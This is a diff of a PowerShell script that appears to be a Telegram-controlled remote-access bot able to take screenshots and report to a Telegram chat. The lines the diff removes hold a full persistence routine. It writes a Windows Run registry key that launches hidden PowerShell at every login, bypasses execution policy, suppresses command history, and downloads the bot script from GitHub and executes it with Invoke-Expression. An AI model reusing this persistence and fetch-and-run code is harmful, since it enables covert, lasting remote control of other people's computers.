@@ -9,16 +9,8 @@ Add-Type                -AssemblyName       System.Windows.Forms
 Add-type                -AssemblyName       System.Drawing
 
 
-$telegram_TOKEN = "#TOKEN#"  # your API Token
-$telegram_ID    = "#ID#"     # your Telegram ID
-
-if (($telegram_TOKEN -eq 7) -and ($telegram_ID -eq 4))
-{
-    Write-Host "...persistence mode..." # TESTING IT...
-    $telegram_TOKEN = "@TOKEN@"
-    $telegram_ID    = "@ID@"
-}
-
+$telegram_TOKEN             = "TOKEN"  # your API Token
+$telegram_ID                = "ID"     # your Telegram ID
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'               -f $telegram_TOKEN
 $api_get_messages           = 'https://api.telegram.org/bot{0}/sendMessage'              -f $telegram_TOKEN
 $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='         -f $telegram_TOKEN
@@ -109,66 +101,6 @@ function takeAScreenShot ()
         Remove-Item ($env:LOCALAPPDATA + "\Temp\screenshot.*")
     } else {
         sendMessage "File was not saved"
-    }
-}
-
-
-function persistenceMode ($mode) 
-{
-    $registry_startup_path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-
-    if ($mode -like "on") 
-    {
-        $powershell_executable_path = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-        $powershell_executable_cmd  = ('-WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-PSReadlineOption -HistorySaveStyle SaveNothing; while(-Not(tnc).PingSucceeded) { Start-Sleep -Seconds 1 }; Invoke-Expression -Command ((((iwr -uri "https://raw.githubusercontent.com/FebVeg/TelegramCommandReceiver/master/bot.ps1").Content).ToString().Replace("@TOKEN@", ') + $telegram_TOKEN + (')).Replace("@ID@", ') + $telegram_ID + (')))')
-        $powershell_startup_script  = ($powershell_executable_path + " " + $powershell_executable_cmd)
-        try {
-            sendMessage "Writing the register key..."
-            Set-ItemProperty -Path $registry_startup_path -Name TelegramBot -Value $powershell_startup_script
-            sendMessage "Doing a check for written registry key..."
-            if (Get-ItemProperty -Path $registry_startup_path -Name "TelegramBot") {
-                sendMessage "Registry key has been written"
-                if ((Get-ItemPropertyValue -Path $registry_startup_path -Name "TelegramBot") -like $powershell_startup_script) {
-                    sendMessage ("Bot now will starts at the login of " + $env:USERNAME)
-                } else {
-                    sendMessage "The value of registry key seems to be different of pre-written script"
-                }
-            } else {
-                sendMessage "Registry key was not written"
-            }
-        } catch {
-            sendMessage $Error[0]
-        }
-    }
-    elseif ($mode -like "off") 
-    {
-        try {
-            if (persistenceMode "status") {
-                sendMessage "Removing the persistence mode..."
-                Remove-ItemProperty -Path $registry_startup_path -Name "TelegramBot" -Force
-                if (-Not(persistenceMode "status")) {
-                    sendMessage "Persistence mode has been removed"
-                } else {
-                    sendMessage "Persistence mode was not removed"
-                }
-            } else {
-                sendMessage "There is no persistence mode activated"
-            }
-        }
-        catch {
-            sendMessage $Error[0]
-        }
-    } 
-    elseif ($mode -like "status") 
-    {
-        sendMessage "Checking the status of the persistence mode..."
-        if (Get-ItemProperty -Path $registry_startup_path -Name "TelegramBot") {
-            sendMessage "Persistence mode activated"
-            return $true
-        } else {
-            sendMessage "No persistence mode found"
-            return $false
-        }
     }
 }
 
